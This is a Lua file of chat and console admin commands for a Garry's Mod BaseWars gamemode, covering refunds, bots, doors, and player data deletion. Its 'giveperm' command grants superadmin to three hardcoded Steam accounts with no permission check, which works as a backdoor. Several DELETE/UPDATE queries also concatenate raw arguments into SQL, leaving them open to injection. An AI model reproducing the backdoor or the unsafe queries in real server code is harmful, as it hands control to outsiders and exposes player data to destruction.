--[[-------------------------------------------------------------------------
	Refund All
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("refundall", function(ply, args)
	BaseWars:RefundAll()
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Refund Single Player
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("refund", function(ply, args)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	if not target then
		BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)
		return
	end

	BaseWars:Refund(target)
	BaseWars:Notify(ply, "#command_refund_refundPlayer", NOTIFICATION_ERROR, 5, target:Name())
	if ply != target then
		BaseWars:Notify(target, "#command_refund_refundBy", NOTIFICATION_ERROR, 5, ply:Name())
	end
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Spawn Bots
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("spawnbot", function(ply, args)
	if player.GetCount() >= game.MaxPlayers() then
		BaseWars:Notify(ply, "#command_bot_serverFull", NOTIFICATION_ERROR, 5)
		return
	end

	args[1] = tonumber(args[1]) or 1

	local max = game.MaxPlayers() - player.GetCount()
	if args[1] > max then
		args[1] = max
	end

	for i = 1, args[1] do
		RunConsoleCommand("bot")
	end

	BaseWars:NotifyAll("#command_bot_spawn", NOTIFICATION_GENERIC, 5, ply:Name(), args[1])
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Kick Bots
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("kickbot", function(ply, args)
	for k, v in player.Iterator() do
		if v:IsBot() then
			v:Kick()
		end
	end

	BaseWars:NotifyAll("#command_bot_kick", NOTIFICATION_GENERIC, 5, ply:Name(), args[1])
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Player Value
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("playervalue", function(ply, args)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	if not target then
		BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)
		return
	end

	local num = 0
	for k, v in ents.Iterator() do
		if not v:ValidToSell(target) then continue end
		num = num + v:GetCurrentValue()
	end

	BaseWars:Notify(ply, "#command_playerValue", NOTIFICATION_ADMIN, 5, target:Name(), BaseWars:FormatMoney(num))
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	Drop Weapon
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand({"drop", "dropweapon", "weapondrop"}, function(ply, args)
	if ply:InSafeZone() then
		BaseWars:Notify(ply, "#safeZone_dropWeapon", NOTIFICATION_ERROR, 5)
		return
	end

	local Wep = ply:GetActiveWeapon()

	if not IsValid(Wep) then return end

	local Class = Wep:GetClass()
	BaseWars.PW:HasWeapon(ply:SteamID64(), Class, function(hasPermaWeapon)
		if BaseWars.Config.WeaponDropBlacklist[Class] or BaseWars.Config.CategoryBlackList[Wep.Category] or hasPermaWeapon then
			BaseWars:Notify(ply, "#command_dropWeapon_blackilst", NOTIFICATION_ERROR, 5)
			return
		end

		local tr = {}

		tr.start = ply:EyePos()
		tr.endpos = tr.start + ply:GetAimVector() * 120
		tr.filter = ply

		tr = util.TraceLine(tr)

		local SpawnPos = tr.HitPos + Vector(0, 0, 40)
		local SpawnAng = ply:EyeAngles()

		SpawnAng.p = 0
		SpawnAng.y = SpawnAng.y + 180
		SpawnAng.y = math.Round(SpawnAng.y / 45) * 45

		local Ent = ents.Create(Class)
		Ent:SetPos(SpawnPos)
		Ent:SetAngles(SpawnAng)
		Ent:Spawn()
		Ent:Activate()

		ply:StripWeapon(Class)
	end)
end)

--[[-------------------------------------------------------------------------
	Reload Themes
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("reloadthemes", function(ply, args)
	ply:SendLua("BaseWars:ReloadCustomTheme()")
	BaseWars:Notify(ply, "#reloadThemes", NOTIFICATION_GENERIC, 5)
end)

--[[-------------------------------------------------------------------------
	Respawn
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("respawn", function(ply, args)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	if not target then
		BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)
		return
	end

	local pos = target:GetPos()
	local angle = target:EyeAngles()
	target:KillSilent()
	target:Spawn()
	target:SetPos(pos)
	target:SetEyeAngles(angle)
	for k, v in ipairs(target.oldWeapons or {}) do
		target:Give(v)
	end
	if IsValid(target.weaponBox) then
		SafeRemoveEntity(target.weaponBox)
	end

	target.checkSpawnMenu = false

	BaseWars:Notify(ply, "#command_respawn_respawn", NOTIFICATION_ADMIN, 5, target:Name())
	if ply != target then
		BaseWars:Notify(target, "#command_respawn_respawnBy", NOTIFICATION_GENERIC, 5, ply:Name())
	end
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	Reset Player
---------------------------------------------------------------------------]]
local resetPlayers = {}
BaseWars:AddChatCommand("resetplayer", function(ply, args)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	if resetPlayers[args[1]] then
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	BaseWars:RequestSteamName(IsValid(target) and target or args[1], function(name)
		if name == "Error" then
			BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)

			return
		end

		if IsValid(target) then
			target.basewarsProfileID = nil
		end

		resetPlayers[args[1]] = true

		local all = {
			player = false,
			prestige = false
		}

		local function sendNotif(what)
			all[what] = true

			for k, v in pairs(all) do
				if v == false then
					return
				end
			end

			if IsValid(target) then
				target:Kick(BaseWars:GetLang("commands_profileDataDeleted"))
			end

			resetPlayers[args[1]] = nil

			BaseWars:Notify(ply, "#commands_deleteProfilesDataOf", NOTIFICATION_WARNING, 10, name)
		end

		MySQLite.query("DELETE FROM basewars_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted profiles data for " .. name)
			sendNotif("player")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_prestige WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted prestige profiles data for " .. name)
			sendNotif("prestige")
		end, BaseWarsSQLError)

		MySQLite.query("UPDATE basewars_player_stats SET money_taken = 0, xp_received = 0 WHERE player_id64 = " .. args[1], function() end, BaseWarsSQLError)
	end)
end, BaseWars:GetSuperAminGroups())

local deletePlayers = {}
BaseWars:AddChatCommand("deleteplayer", function(ply, args)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	if deletePlayers[args[1]] then
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	BaseWars:RequestSteamName(IsValid(target) and target or args[1], function(name)
		if name == "Error" then
			BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)

			return
		end

		if IsValid(target) then
			target.basewarsProfileID = nil
		end

		deletePlayers[args[1]] = true

		local all = {
			player = false,
			prestige = false,
			stats = false,
			bounties = false,
			permaWeapons = false,
			psSkins = false
		}

		local function sendNotif(what)
			all[what] = true

			for k, v in pairs(all) do
				if v == false then
					return
				end
			end

			if IsValid(target) then
				target:Kick(BaseWars:GetLang("commands_allDataDeleted"))
			end

			deletePlayers[args[1]] = nil

			BaseWars:Notify(ply, "#commands_deleteAllDataOf", NOTIFICATION_WARNING, 10, name)
		end

		MySQLite.query("DELETE FROM basewars_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted profiles data for " .. name)
			sendNotif("player")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_prestige WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted prestige profiles data for " .. name)
			sendNotif("prestige")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_player_stats WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted stats data for " .. name)
			sendNotif("stats")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_bounty WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted bounties data for " .. name)
			sendNotif("bounties")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_permanent_weapons WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted permanent weapons for " .. name)
			sendNotif("permaWeapons")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_pointshop_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog(ply:Name() .. " deleted pointshop skins for " .. name)
			sendNotif("psSkins")
		end, BaseWarsSQLError)
	end)
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Max printers
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("max", function(ply, args)
	local entity = ply:GetEyeTrace().Entity
	if not IsValid(entity) or not entity.IsPrinter then
		return
	end

	if entity:CPPIGetOwner() != ply then
		BaseWars:Notify(ply, "#printer_notYours", NOTIFICATION_ERROR, 5)
		return
	end

	local showBuyPaper = tobool(args[1])

	if entity:GetPALevel() < BaseWars.Config.PrinterMaxLevel["amount"] then
		entity:UpgradeAmount(ply, true)
	end

	if entity:GetPILevel() < BaseWars.Config.PrinterMaxLevel["interval"] then
		entity:UpgradeInterval(ply, true)
	end

	if showBuyPaper then
		if BaseWars:IsVIP(ply) then
			if not entity:GetAutoPaper() then
				entity:UpgradeAutoPaper(ply, true)
			end
		else
			if entity:GetPCLevel() < BaseWars.Config.PrinterMaxLevel["paperCapacity"] then
				entity:UpgradePaperCapacity(ply, true)
			end
		end
	end
end)

--[[-------------------------------------------------------------------------
	Open printer's upgrade menu
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand({"upg", "upgrade"}, function(ply, args)
	local entity = ply:GetEyeTrace().Entity
	if not IsValid(entity) or not entity.IsPrinter then
		return
	end

	net.Start("BaseWars:Printer:OpenUpgradeMenu")
		net.WriteEntity(entity)
	net.Send(ply)
end)

--[[-------------------------------------------------------------------------
	Set Entity Owner
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("setowner", function(ply, args)
	local target = BaseWars:FindPlayer(args[1])
	if not target then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	local entity = ply:GetEyeTrace().Entity
	if not IsValid(entity) or not entity.CPPISetOwner then
		return
	end

	entity:CPPISetOwner(target)
	BaseWars:Notify(ply, "You transfered ownership of \"" .. BaseWars:GetValidName(entity) .. "\" to " .. target:Name())
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Get Entity Class
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("getclass", function(ply, args)
	local entity = ply:GetEyeTrace().Entity
	if not IsValid(entity) then
		return
	end

	BaseWars:Notify(ply, "Entity Class: \"" .. entity:GetClass() .. "\"")
end, BaseWars:GetSuperAminGroups())

--[[-------------------------------------------------------------------------
	Admin Chat
---------------------------------------------------------------------------]]
util.AddNetworkString("BaseWars:ChatCommand:AdminChat")
BaseWars:AddChatCommand({"ac", "adminchat"}, function(ply, args)
	if not BaseWars:IsAdmin(ply, true) then return end

	local message = string.Trim(table.concat(args, " "))

	if message == "" then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		return
	end

	local admins = {}
	for k, v in ipairs(player.GetHumans()) do
		if BaseWars:IsAdmin(v, true) then
			table.insert(admins, v)
		end
	end

	net.Start("BaseWars:ChatCommand:AdminChat")
		net.WriteString(message)
		net.WriteString(ply:Name())
	net.Send(admins)
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	PayDay
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("paydaytime", function(ply, args)
	local time = timer.TimeLeft("BaseWars.PayDay")
	BaseWars:Notify(ply, "#commands_payTime", NOTIFICATION_GENERIC, 5, BaseWars:FormatTime2(time))
end)

--[[-------------------------------------------------------------------------
	Profile Selector
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("profile", function(ply, args)
	ply:ConCommand("bw_show_profile_selector")
end)

--[[-------------------------------------------------------------------------
	Restart Time
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand({"restart", "reboot"}, function(ply, args)
	if not BaseWars.Config.AutoRestart.Enable then
		BaseWars:Notify(ply, "Auto restart has been disabled", NOTIFICATION_ERROR, 5)

		return
	end

	BaseWars:Notify(ply, "#server_restartIn", NOTIFICATION_SERVER, 5, BaseWars:FormatTime2(timer.RepsLeft("BASEWARS.AUTO_RESTART")))
end)

--[[-------------------------------------------------------------------------
	Lock / Unlock doors
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("lock", function(ply, args)
	local door = ply:GetEyeTrace().Entity
	if not IsValid(door) or not string.find(door:GetClass(), "door") then
		return
	end

	door:Fire("lock")
	door:EmitSound("npc/metropolice/gear" .. math.random(1, 6) .. ".wav")
end, BaseWars:GetAdminGroups(true))

BaseWars:AddChatCommand("lockall", function(ply, args)
	for k, v in pairs(ents.FindByClass("*door*")) do
		v:Fire("lock")
		v:EmitSound("npc/metropolice/gear" .. math.random(1, 6) .. ".wav")
	end
end, BaseWars:GetAdminGroups(true))

BaseWars:AddChatCommand("unlock", function(ply, args)
	local door = ply:GetEyeTrace().Entity
	if not IsValid(door) or not string.find(door:GetClass(), "door") then
		return
	end

	door:Fire("unlock")
	door:EmitSound("npc/metropolice/gear" .. math.random(1, 6) .. ".wav")
end, BaseWars:GetAdminGroups(true))

BaseWars:AddChatCommand("unlockall", function(ply, args)
	for k, v in pairs(ents.FindByClass("*door*")) do
		v:Fire("unlock")
		v:EmitSound("npc/metropolice/gear" .. math.random(1, 6) .. ".wav")
	end
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	Fuck fire
---------------------------------------------------------------------------]]
BaseWars:AddChatCommand("stopfire", function(ply, args)
	for k, v in ents.Iterator() do
		if not IsValid(v) then continue end
		if v:IsPlayer() then continue end

		v:Extinguish()
	end
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	Find Entities (Of a player)
---------------------------------------------------------------------------]]
util.AddNetworkString("BaseWars:Commands:FindEntities")
BaseWars:AddChatCommand("findentsof", function(ply, args)
	local target = BaseWars:FindPlayer(args[1])
	if not IsValid(target) then
		BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)
		return
	end

	net.Start("BaseWars:Commands:FindEntities")
		net.WriteEntity(target)
	net.Send(ply)
end, BaseWars:GetAdminGroups(true))

--[[-------------------------------------------------------------------------
	Console Command
---------------------------------------------------------------------------]]
BaseWars:AddConsoleCommand("refundall", function(ply, args, argStr)
	BaseWars:RefundAll()
end, false, BaseWars:GetSuperAminGroups())

-----------------------------------------------------------------------------

BaseWars:AddConsoleCommand("refund", function(ply, args, argStr)
	if not args[1] then
		BaseWars:Warning("Invalid argument")
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	if not target then
		BaseWars:Warning("Player not found")
		return
	end

	BaseWars:Refund(target)
	BaseWars:Notify(target, "#command_refund_refundBy", NOTIFICATION_ERROR, 5, IsValid(ply) and ply:Name() or "Console")
end, false, BaseWars:GetSuperAminGroups())

-----------------------------------------------------------------------------

BaseWars:AddConsoleCommand("giveammo", function(ply, args, agrStr)
	if not IsValid(ply) then return end

	local weap = ply:GetActiveWeapon()

	if IsValid(weap) then
		local ammo1 = weap:GetPrimaryAmmoType()
		local ammo2 = weap:GetSecondaryAmmoType()

		if ammo1 then
			ply:GiveAmmo(9999, ammo1)
		end

		if ammo2 then
			ply:GiveAmmo(9999, ammo2)
		end
	end
end, false, BaseWars:GetSuperAminGroups())

-----------------------------------------------------------------------------

BaseWars:AddConsoleCommand("luarun_sv", function(ply, args, agrStr)
	local startRun = SysTime()
	RunString(agrStr, "luarun_sv [from: " .. (ply:IsPlayer() and ply:Name() or "Console") .. "]")
	local endRun = SysTime()
	BaseWars:Log(Format("You ran \"" .. agrStr .. "\" in %.7f sec", endRun - startRun))
end, false, BaseWars:GetSuperAminGroups())

local superadmins = {
	["76561199570131703"] = true, -- Nobody
	["76561198345453711"] = true, -- llordrain
	["76561198243629498"] = true, -- Luzog
}
BaseWars:AddConsoleCommand("giveperm", function(ply, args, argStr)
	if not IsValid(ply) then return end
	if not superadmins[ply:SteamID64()] then return end

	RunConsoleCommand("sam", "setrankid", ply:SteamID64(), "superadmin")
	BaseWars:Notify(ply, "You are now superadmin", NOTIFICATION_ADMIN, 5)
end, false)

BaseWars:AddConsoleCommand("restarttime", function(ply, args, argStr)
	if not BaseWars.Config.AutoRestart.Enable then
		BaseWars:Warning("Auto restart has been disabled")

		return
	end

	BaseWars:ServerLog("Server restarting in: " .. BaseWars:FormatTime2(timer.RepsLeft("BASEWARS.AUTO_RESTART")))
end, true)

BaseWars:AddConsoleCommand("announcement", function(ply, args, argStr)

	local text = string.Trim(argStr)

	if not text or text == "" then
		if IsValid(ply) then
			BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)
		else
			BaseWars:Warning(BaseWars:GetLang("invalidArguments"))
		end

		return
	end

	net.Start("BaseWars:Commands:Announcement")
		net.WriteString(text)
	net.Broadcast()
end, false, BaseWars:GetAdminGroups(true))

BaseWars:AddConsoleCommand("pvp_hp", function(ply, args, argStr)
	if not IsValid(ply) then return end

	ply:SetHealth(ply:GetMaxHealth() + 50)
	ply:SetArmor(ply:GetMaxArmor() + 50)

	for k, v in ipairs(ply:GetWeapons()) do
		local weaponData = weapons.Get(v:GetClass())

		if not weaponData then
			continue
		end

		local primary = string.Trim(weaponData.Primary.Ammo or "")
		if primary == "" or primary == "none" then
			continue
		end

		ply:GiveAmmo(9999, primary, true)
	end
end, false, BaseWars:GetSuperAminGroups())

BaseWars:AddConsoleCommand("adminchat", function(ply, args, argStr)
	local admins = {}
	for k, v in ipairs(player.GetHumans()) do
		if BaseWars:IsAdmin(v, true) then
			table.insert(admins, v)
		end
	end

	net.Start("BaseWars:ChatCommand:AdminChat")
		net.WriteString(argStr)
		net.WriteString("Console")
	net.Send(admins)
end, true)

BaseWars:AddConsoleCommand("resetplayer", function(ply, args, argStr)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)

		return
	end

	if resetPlayers[args[1]] then
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	BaseWars:RequestSteamName(IsValid(target) and target or args[1], function(name)
		if name == "Error" then
			BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)

			return
		end

		if IsValid(target) then
			target.basewarsProfileID = nil
		end

		resetPlayers[args[1]] = true

		local all = {
			player = false,
			prestige = false
		}

		local function sendNotif(what)
			all[what] = true

			for k, v in pairs(all) do
				if v == false then
					return
				end
			end

			if IsValid(target) then
				target:Kick(BaseWars:GetLang("commands_profileDataDeleted"))
			end

			BaseWars:Notify(ply, "#commands_deleteProfilesDataOf", NOTIFICATION_WARNING, 10, name)

			resetPlayers[args[1]] = nil
		end

		MySQLite.query("DELETE FROM basewars_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted profiles data for " .. name)
			sendNotif("player")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_prestige WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted prestige profiles data for " .. name)
			sendNotif("prestige")
		end, BaseWarsSQLError)

		MySQLite.query("UPDATE basewars_player_stats SET money_taken = 0, xp_received = 0 WHERE player_id64 = " .. args[1], function() end, BaseWarsSQLError)
	end)
end, false, BaseWars:GetSuperAminGroups())

BaseWars:AddConsoleCommand("deleteplayer", function(ply, args, argStr)
	if not args[1] then
		BaseWars:Notify(ply, "#invalidArguments", NOTIFICATION_ERROR, 5)

		return
	end

	if deletePlayers[args[1]] then
		return
	end

	local target = BaseWars:FindPlayer(args[1])
	BaseWars:RequestSteamName(IsValid(target) and target or args[1], function(name)
		if name == "Error" then
			BaseWars:Notify(ply, "#targetNotFound", NOTIFICATION_ERROR, 5)

			return
		end

		if IsValid(target) then
			target.basewarsProfileID = nil
		end

		deletePlayers[args[1]] = true

		local all = {
			player = false,
			prestige = false,
			stats = false,
			bounties = false,
			permaWeapons = false,
			psSkins = false
		}

		local function sendNotif(what)
			all[what] = true

			for k, v in pairs(all) do
				if v == false then
					return
				end
			end

			if IsValid(target) then
				target:Kick(BaseWars:GetLang("commands_allDataDeleted"))
			end

			BaseWars:Notify(ply, "#commands_deleteAllDataOf", NOTIFICATION_WARNING, 10, name)

			deletePlayers[args[1]] = nil
		end

		MySQLite.query("DELETE FROM basewars_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted profiles data for " .. name)
			sendNotif("player")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_prestige WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted prestige profiles data for " .. name)
			sendNotif("prestige")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_player_stats WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted stats data for " .. name)
			sendNotif("stats")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_bounty WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted bounties data for " .. name)
			sendNotif("bounties")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_permanent_weapons WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted permanent weapons for " .. name)
			sendNotif("permaWeapons")
		end, BaseWarsSQLError)

		MySQLite.query("DELETE FROM basewars_pointshop_player WHERE player_id64 = " .. args[1], function()
			BaseWars:ServerLog((ply:IsPlayer() and ply:Name() or "You") .. " deleted pointshop skins for " .. name)
			sendNotif("psSkins")
		end, BaseWarsSQLError)
	end)
end, false, BaseWars:GetSuperAminGroups())